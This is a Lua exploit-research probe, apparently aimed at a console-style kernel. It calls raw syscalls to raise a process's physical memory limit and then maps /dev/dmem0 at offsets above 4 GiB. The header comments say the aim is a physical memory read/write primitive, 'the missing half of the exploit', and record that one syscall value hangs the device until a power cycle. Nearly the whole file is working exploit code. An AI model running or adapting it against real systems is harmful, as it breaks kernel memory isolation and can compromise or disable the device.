-- CRASH_CLASS: MODERATE
-- PROBE 1409a: does 637 set_phys_fmem_limit move the /dev/dmem0 offset ceiling?
--
-- prior art:
--   results/phase36_realargs/1397d_dmem_extent_regs_20261109_142819.txt
--     offsets 0..0x100000000 (4 GiB) map on /dev/dmem0; 0x200000000 and above answer
--     EACCES(13); single mappings up to len 0x80000000 succeed.
--   results/phase36_realargs/1397e_dmem_page0_liveness_20261109_142921.txt
--     rungs are independent and contiguous; page 0 is a static table.
--   results/phase36_realargs/1397f_dmem_content_map_20261109_143000.txt
--     1 of 256 rungs at 16 MiB granularity is non-zero - the populated block starts 0xF000.
--   docs/DMEM_WINDOW_14_10.md
--   probes/phase17_new_vectors/339a_637_598_659.lua and 340a_dynlib_out_637_limit.lua
--     637(id, value) with id 0 (self) accepts any qword and stores it at
--     parent+0x200 -> child+0x280, documented as the physical memory limit; values BELOW
--     current usage block the caller forever (637(0,17) never returns, needs a power cycle),
--     so only huge values are safe here.
--   results/phase17_new_vectors/346b_* (637's store is inert for the GPU mmap chunk ceiling)
--     - that test changed the number of GPU mmap chunks, which is a different limit; the
--     dmem offset ceiling was never tested against 637.
--
-- Hypothesis: the EACCES above 4 GiB is `offset + len > physical_limit`, so raising the
-- limit should let the same node map a page beyond 4 GiB. If it does, /dev/dmem becomes a
-- window over arbitrary PHYSICAL addresses instead of the 4 GiB GPU aperture - a physical
-- read/write primitive, which is the missing half of the exploit.
--
-- Order: control reading first, then the single 637 call, then the same reads again.
-- Every read is preceded by its own print, so a fault costs no information.

print("=== PROBE 1409a: 637 -> DMEM CEILING ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function rd(a) local ok,v = pcall(function() return N(memory.read_dword(a)) end) if ok then return v % 4294967296 end return nil end
local function hex4(v) if v == nil then return "????????" end return string.format("%08X", v) end

print(string.format("[0] pid=%d", N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))

local function str_addr(s)
    local b = memory.alloc(#s + 1)
    for i = 1, #s do pcall(function() memory.write_byte(b + i - 1, uint64(s:byte(i))) end) end
    pcall(function() memory.write_byte(b + #s, uint64(0)) end)
    return b
end

local fd0 = N(mk(5)(uint64(str_addr("/dev/dmem0")), uint64(0x4002), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] dmem0 fd=%d", fd0))
if fd0 ~= 3 and fd0 ~= 4 and fd0 ~= 5 and fd0 ~= 6 and fd0 ~= 7 and fd0 ~= 8 then
    print("[!] unexpected fd, continuing anyway")
end

local sc477 = mk(477)
local sc637 = mk(637)
local sc628 = mk(628)

local function mapit(off, prot, len)
    return N(sc477(uint64(0), uint64(len or 0x1000), uint64(prot or 1), uint64(1), uint64(fd0), uint64(off)))
end

local OFFS = {0x100000000, 0x200000000, 0x400000000, 0x1000000000, 0x10000000000}

local function sweep(note)
    print("")
    print(note)
    for _, off in ipairs(OFFS) do
        local va = mapit(off, 1, 0x1000)
        if va < 0x10000 or va > 0x8000000000 then
            print(string.format("  off=0x%-14X map=%d errno=%s", off, va, es()))
        else
            print(string.format("  off=0x%-14X map=0x%X", off, va))
            io.write("")
            print(string.format("    about to read 0x%X", va))
            print(string.format("    [0]=%s", hex4(rd(va))))
        end
    end
end

sweep("[A] control, before any 637 call")

print("")
print("[B] 637(0, 0xFFFFFFFFFFFFF000) - raise the physical memory limit to the maximum")
local rv = "?"
do
    local ok
    ok, rv = pcall(function() return sc637(uint64(0), uint64(0xFFFFFFFFFFFFF000), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if not ok then rv = "EXC" end
end
print(string.format("  637 = %s errno=%s", tostring(rv), es()))

sweep("[C] the same offsets after the 637 call")

print("")
print("[D] 628 mmap_dmem with a physical address above 4 GiB")
for _, phys in ipairs({0x100000000, 0x200000000, 0x1000000000}) do
    local r
    local ok
    ok, r = pcall(function() return sc628(uint64(phys), uint64(0x4000), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if not ok then r = "EXC" end
    print(string.format("  628(0x%X, 0x4000) = %s errno=%s", phys, tostring(r), es()))
end

print("")
print("[E] control: the window at a known-good offset still reads")
local va = mapit(0x1000, 1, 0x1000)
print(string.format("  off=0x1000 map=0x%X [0]=%s", va, hex4(rd(va))))

print("")
print("=== 1409a DONE ===")
